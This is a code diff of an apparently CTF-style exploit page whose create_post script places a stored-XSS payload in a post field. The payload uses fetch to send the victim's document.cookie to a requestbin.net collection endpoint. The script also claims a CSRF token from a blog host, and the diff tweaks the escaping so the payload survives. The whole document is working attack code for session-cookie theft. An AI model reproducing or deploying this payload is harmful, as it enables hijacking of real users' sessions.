@@ -34,7 +34,7 @@
 
 <script>
     async function create_post(){
-        document.getElementById("content").value = "<script>fetch('https://requestbin.net/r/8g9looxh?q='+document.cookie, { mode: 'no-cors' })</script>";
+        document.getElementById("content").value = "<script>fetch('https://requestbin.net/r/8g9looxh?q='+document.cookie, { mode: 'no-cors' })\</script>";
         let content = encodeURIComponent(document.getElementById("content").value);
         let content_hash = CryptoJS.MD5(content).toString();
         await fetch(`https://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`);
